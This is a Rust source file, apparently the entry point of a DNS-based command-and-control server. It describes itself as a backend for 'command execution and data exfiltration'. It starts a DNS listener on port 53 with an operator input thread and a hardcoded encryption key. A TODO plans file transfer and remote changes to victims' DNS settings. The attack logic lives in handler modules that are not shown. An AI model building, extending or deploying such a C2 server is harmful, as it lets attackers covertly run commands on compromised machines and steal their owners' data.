mod handler;
mod utils;
mod crypto;
use permit::Permit;
use signal_hook::consts::{SIGHUP, SIGINT, SIGQUIT, SIGTERM};
use signal_hook::iterator::Signals;
use argparse::{ArgumentParser, Store};

/*
TODO
1. Maybe add the ability to download/upload files
2. Add the ability to reconfigure client's DNS server address trough a command
*/

//Encryption key
pub static ENCRYPTION_KEY: &str = "Ql60hqrp1NhiCzH8XZRaJkUy2mU7COgV";


fn main() {

    // Argument parser for the server's port
    let mut port_arg: String = String::from("53");
    {
        let mut ap = ArgumentParser::new();
        ap.set_description("Simple DNS server backend for command exeuction and data exfiltration");
        ap.refer(&mut port_arg)
            .add_option(&["-p", "--port"], Store, "Port for the DNS server to listen on, default: 53");
        ap.parse_args_or_exit();
    }

    let port: u16 = match port_arg.parse::<u16>() {
        Ok(port) => port,
        Err(e) => {
            println!("[!] Could not parse port argument: {}", e);
            53
        }
    };

    let top_permit = Permit::new();
    let permit = top_permit.new_sub();
    std::thread::spawn(move || {
        Signals::new([SIGHUP, SIGINT, SIGQUIT, SIGTERM])
            .unwrap()
            .forever()
            .next();
        drop(top_permit);
    });

    std::thread::spawn(move || {
        utils::get_input();
    });

    println!("[+] Starting dns server on port {}", port);
    dns_server::Builder::new_port(port)
        .unwrap()
        .with_permit(permit)
        .serve(&handler::dns_handler)
        .unwrap();
}